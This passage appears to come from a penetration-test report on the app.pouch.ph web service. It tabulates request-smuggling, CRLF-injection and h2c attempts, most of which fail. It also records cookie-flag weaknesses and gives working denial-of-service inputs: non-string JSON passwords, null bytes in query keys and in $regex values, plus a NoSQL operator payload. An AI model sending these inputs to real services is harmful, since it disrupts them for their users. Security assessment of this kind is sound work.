| Multi-line value | `Transfer-Encoding: chunked\r\n identity` | 400 |

Cloudflare normalizes all Transfer-Encoding header variants before forwarding. No
obfuscation bypasses the proxy's TE detection.

### Chunk Extension Abuse

| Payload | Result |
|---------|--------|
| `1;ext=val\r\nG\r\n0\r\n\r\n` | 404 (reached backend, no desync) |
| Chunk extension with long random data | 404 (reached backend, no desync) |
| Chunk extension with injected headers | 404 (reached backend, no desync) |

Chunk extensions pass through Cloudflare but the backend processes them normally.
No request boundary confusion observed.

### Request Line Smuggling

| Variant | Result |
|---------|--------|
| Absolute URL (`GET http://app.pouch.ph/...`) | 200 (no desync) |
| Double space before HTTP version | 200 (no desync) |
| `@` in URL path | 200 (no desync) |
| Tab as SP separator | 400 |
| Fragment in request line | 200 (no desync) |

### HTTP Version Tricks

| Version | Result |
|---------|--------|
| HTTP/1.0 | 426 Upgrade Required |
| HTTP/0.9 | 426 Upgrade Required |
| HTTP/2.0 over h1 TLS | 426 Upgrade Required |

### Content-Length Tricks

| Variant | Result |
|---------|--------|
| Duplicate CL headers (different values) | 400 |
| CL with leading zero (`Content-Length: 06`) | 404 (reached backend, no desync) |
| Negative CL (`Content-Length: -1`) | 400 |
| CL + TE together (standard) | 400 |

### CRLF Header Injection

| Payload | Result |
|---------|--------|
| CRLF in header value to inject arbitrary header | 200 (header injected, but no smuggling) |
| CRLF to inject `Transfer-Encoding: chunked` | 400 (Cloudflare still catches TE) |
| CRLF to inject `Content-Length: 0` | 400 |
| CRLF with double CRLF (body injection) | 200 (no desync observed) |

CRLF characters pass through in header values, but Cloudflare catches any injected
CL or TE headers even when delivered via CRLF injection.

### HTTP Pipelining

| Test | Result |
|------|--------|
| Two back-to-back requests on single connection | Both responses returned correctly |
| Pipeline with mismatched CL | 400 |

Pipelining works (server returns both responses), but no desync or response queue
poisoning observed. Cloudflare serializes pipelined requests correctly.

### H2C Upgrade (HTTP/2 Cleartext)

| Payload | Result |
|---------|--------|
| `Connection: Upgrade, HTTP2-Settings` + `Upgrade: h2c` | 200 (no actual protocol upgrade) |

Server returns 200 but does not actually upgrade to HTTP/2. The upgrade header is
silently ignored. No tunnel or smuggling path available.

### Conclusion
Cloudflare acts as a full HTTP terminating proxy. It parses, normalizes, and re-serializes
every request before forwarding to the Render.com backend. All desync vectors are dead:
- TE/CL conflicts: detected and rejected (400)
- TE obfuscation: all 15+ variants normalized before forwarding
- CRLF injection: passes through but injected TE/CL still caught
- Pipelining: serialized correctly
- H2C upgrade: ignored
- Version downgrade: rejected (426)

**HTTP request smuggling is not viable against this target.**

---

## APPENDIX D: Additional Security Findings

### D1: Cookie Security Issues (Low-Medium)

The `connect.sid` session cookie has configuration weaknesses:

| Attribute | Value | Issue |
|-----------|-------|-------|
| HttpOnly | YES | Good - prevents XSS cookie theft |
| Secure | **MISSING** | Cookie sent over HTTP (MITM stealable) |
| SameSite | **MISSING** | Defaults to Lax in modern browsers, but older browsers send cross-site |
| Expires | Sat, 25 Sep 2027 | 2-year expiry (excessive session lifetime) |
| Path | / | Standard |
| Domain | .pouch.ph | Scoped to domain |

**Impact:** On a network where an attacker can intercept HTTP traffic (public WiFi, MITM),
the session cookie is transmitted in cleartext. The missing SameSite attribute theoretically
allows CSRF in older browsers.

**Practical limitation:** All bridge/admin endpoints enforce server-side auth checks (403),
so even a stolen regular-user cookie only grants access to that user's own data. The CSRF
angle is limited because state-changing endpoints likely require CSRF tokens or are JSON-only.

**CVSS:** 4.8 Medium (AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N)

### D2: Auth Type Confusion DoS (Low-Medium)

The login endpoint (`POST /api/v0/auth`) does not validate input types before passing to
bcrypt. Sending non-string types causes different failure modes:

| Input | Result | Cause |
|-------|--------|-------|
| `{"username":"test","password":123}` (integer) | **Server hang (30s+)** | bcrypt.compare crashes on non-string |
| `{"username":"test","password":true}` (boolean) | **Server hang (30s+)** | bcrypt.compare crashes on non-string |
| `{"username":["test"],"password":"test"}` (array) | 500 error | Error: "The 'data' argument must be of type string" |
| `{"username":{"$gt":""},"password":"test"}` (object/NoSQLi) | 500 error | Same type error (crashes before query) |
| `{"username":"test","password":["test"]}` (array) | 200, login fails | bcrypt handles array gracefully |

**Impact:** Non-string password causes indefinite server hang (one connection per request).
Similar to the null byte DoS but requires POST body. The 500 errors also disclose internal
error messages (minor info disclosure).

**Note:** The username-as-object (NoSQLi on login) does NOT work because the server crashes
at bcrypt.compare before the MongoDB query executes. The type error acts as an accidental
defense against auth bypass via NoSQLi on the login endpoint.

**CVSS:** 5.3 Medium (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)

### D3: CORS Configuration (Clean)

| Test | Result |
|------|--------|
| `Origin: https://evil.com` | No `Access-Control-Allow-Origin` header |
| `Origin: https://app.pouch.ph` | No ACAO header |
| `Origin: null` | No ACAO header |
| Preflight OPTIONS | No ACAO header |

The API does not return CORS headers at all. This means:
- Cross-origin JavaScript cannot read API responses (browser enforces same-origin policy)
- No CORS misconfiguration to exploit
- API is effectively same-origin only from a browser perspective

### D4: Null Byte Deep Dive -- DoS Only, No Data Exfil (Confirmed)

Extended testing of the null byte hang vector beyond simple DoS:

| Test | Result |
|------|--------|
| Key truncation (`admin%00junk` as username) | No truncation, user:null |
| Value truncation (`username=admin%00extra`) | 200, user:null (no match) |
| Null byte in URL path (`/api/v0/user%00/admin`) | 404 |
| Different endpoints with null in key | All hang identically |
| Null byte in POST body (urlencoded) | 200 OK (no hang) |
| Null byte in POST body (JSON) | 200 OK (no hang) |
| Timing oracle (null vs non-null) | No distinguishable timing difference |

**Conclusion:** The null byte vulnerability is strictly a connection-exhaustion DoS vector.
It cannot be leveraged for:
- Data extraction (no truncation or oracle behavior)
- WAF bypass (mangled keys don't match anything useful)
- Authentication bypass (non-matching keys just return user:null)

The hang only occurs in the Express qs query string parser (GET params). POST body parsers
(both urlencoded and JSON) handle null bytes without hanging.

Two distinct null byte hang vectors confirmed:
1. Null byte in query parameter KEY name (qs parser) -- any endpoint
2. Null byte in `$regex` VALUE on password field (MongoDB regex engine) -- `/api/v0/user` only
